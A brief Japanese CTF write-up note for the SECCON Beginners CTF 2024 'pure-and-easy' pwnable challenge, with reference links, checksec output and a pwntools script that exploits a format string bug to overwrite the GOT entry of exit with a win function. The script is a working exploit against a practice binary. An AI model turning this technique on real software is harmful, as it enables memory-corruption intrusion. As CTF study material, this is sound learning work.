# Format String Bug
- https://feneshi.co/ctf4b2024writeup/#pure_and_easy
- [fmtstr_payloadを紐解いて書式文字列攻撃を理解する #脆弱性 - Qiita](https://qiita.com/mae_t/items/91a82f8efe361305c29b)
- https://docs.pwntools.com/en/stable/fmtstr.html
# 解説
```
pwndbg> checksec
File:     /mnt/e/work/ctf/SECCON_Beginners_CTF_2024/pwnable/pure-and-easy/chall
Arch:     amd64
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```
- Partial RELRO は GOT overwrite が使える
```python
#!/usr/bin/env python3
from pwn import *
exe = context.binary = ELF('./chall')
io = process([exe.path])
# io.sendlineafter(b'>', b"A"*8 + b",%p"*20)
io.sendlineafter(b'> ', fmtstr_payload(6, {
    exe.got['exit']: exe.symbols['win']
}))
log.info(io.recvall().decode(errors='ignore'))
```
